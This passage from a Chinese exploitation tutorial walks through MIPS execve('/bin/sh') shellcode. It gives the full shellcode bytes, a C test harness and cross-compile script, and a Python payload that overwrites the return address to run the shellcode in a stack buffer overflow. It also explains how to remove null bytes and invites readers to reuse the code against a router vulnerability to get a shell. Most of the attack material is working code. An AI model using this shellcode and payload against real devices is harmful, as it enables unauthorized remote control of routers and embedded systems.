这里推荐的大家一个网址，有大部分的MIPS指令集合：[MIPS指令集合](http://www.mrc.uidaho.edu/mrc/people/jff/digital/MIPSir.html
"MIPS指令集合") 我们会发现，优化过后的execve的shellcode指令长度和直接从c语言编译再反编译过来的长度要缩减很多。
#### 2\. 提取shellcode对应的二进制代码
接着，我们需要用程序中提取shellcode对应的二进制代码。
传统的方式，需要在IDA中寻找到对应的shellcode的二进制代码，比如
然后拷贝出来，再处理成这样类似的字符串形式：
可以发现，工作量还是有不少的。因此，我开发了一个简单的工具，来自动的从编译好的二进制代码中，提取对应的shellcode。使用下面的简单命令，就可以提取成c测试格式的二进制代码，或者py测试的。
    $ python shell_extractor.py execve c
    char shellcode[] = {
    "x24x06x06x66"
    "x04xd0xffxff"
    "x28x06xffxff"
    "x27xbdxffxe0"
    "x27xe4x10x01"
    "x24x84xf0x1f"
    "xafxa4xffxe8"
    "xafxa0xffxec"
    "x27xa5xffxe8"
    "x24x02x0fxab"
    "x00x00x00x0c"
    "x2fx62x69x6e"
    "x2fx73x68x00"
    };
用法来说，就是：
    [+] usage: python shell_extractor.py [filename] [format]
    [*] where format can be c or py
这个工具的核心部分，就是利用readelf –S execve这个命令，来获取shellcode中关键code的部分，然后提取出来构造成需要的格式。
比如，上述 的0xd0就是shellcode二进制代码的起始偏移，0x30就是代码的长度。
#### 3\. c语言中测试shellcode
按照工具里面的构造，选择c语言格式输出以后，按照下面的c代码格式，就可以方便的测试一下shellcode的了。比如对于execve这个函数。
    #include 
    char shellcode[] = {
    "x24x06x06x66"
    "x04xd0xffxff"
    "x28x06xffxff"
    "x27xbdxffxe0"
    "x27xe4x10x01"
    "x24x84xf0x1f"
    "xafxa4xffxe8"
    "xafxa0xffxec"
    "x27xa5xffxe8"
    "x24x02x0fxab"
    "x00x00x00x0c"
    "x2fx62x69x6e"
    "x2fx73x68x00"
    };
    void main()
    {
        void (*s)(void);
        printf("sc size %dn", sizeof(shellcode));
        s = shellcode;
        s();
        printf("[*] work done.n");
    }
接着使用如下的脚本：
    src=$1
    dst=$2
    ~/qemu_dependence/buildroot-mips/output/host/bin/mips-linux-gcc $src -static -o  $dst
指令命令类似于：
    bash comp-mips.sh execve_c.c execve_c
就可以完成编译
#### 4\. 构造payload测试shellcode
到了这一步，payload的构造方式其实和之前介绍的文章差不多的了。唯一的差别就在于，这回需要覆盖的RA的地址，就是堆栈的起始地址，因此，一个样例的payload可以是：
    import struct
    print '[*] prepare shellcode',
    #shellcode
    shellcode = "A"*0x19C             # padding buf
    shellcode += struct.pack(">L",0x408002D8)     # this is the sp address for executing cmd.
    shellcode += "x24x06x06x66"
    shellcode += "x04xd0xffxff"
    shellcode += "x28x06xffxff"
    shellcode += "x27xbdxffxe0"
    shellcode += "x27xe4x10x01"
    shellcode += "x24x84xf0x1f"
    shellcode += "xafxa4xffxe8"
    shellcode += "xafxa0xffxec"
    shellcode += "x27xa5xffxe8"
    shellcode += "x24x02x0fxab"
    shellcode += "x00x00x00x0c"
    shellcode += "x2fx62x69x6e"
    shellcode += "x2fx73x68x00"
    print ' ok!'
    #create password file
    print '[+] create password file',
    fw = open('passwd','w')
    fw.write(shellcode)#'A'*300+'x00'*10+'BBBB')
    fw.close()
    print ' ok!'
上述的例子基于的漏洞是文章xx中提供的具有漏洞的程序。可以发现是可以成功利用的。
但是，细心的读者一定发现了，这里面仍然是有nullbyte的，即在调用syscall的时候，shellcode +=
“x00x00x00x0c”，提取的二进制code是这样的。其实他可以改成shellcode +=
“x01x01x01x0c”的形式，就能够成功绕过null byte的问题了。
这里给感兴趣的读者留一个自己练习的题目，即，同样是上面的这段shellcode，感兴趣的读者可以试试把这段代码放到上篇文章xx提到的路由器漏洞中，照葫芦画瓢的试试能不能拿到shell。^_^
#### 总结
本文主要介绍了shellcode的编写流程，以及自己开发的一个快速shellcode二进制代码提取工具。Shellcode的编写中，绕过null
byte的方式，可以通过优化代码，比如上述（”x00x00x00x0c”改成x01x01x01x0c），也可以通过对shellcode进行二次编码的方式。Shellcode的编码花样可以很多，可以将shellcode进行压缩，可以将shellcode的bad
bytes给替换掉。这些内容将在未来介绍。
* * *
_本文经安全客授权发布，转载请联系安全客平台。_
* * *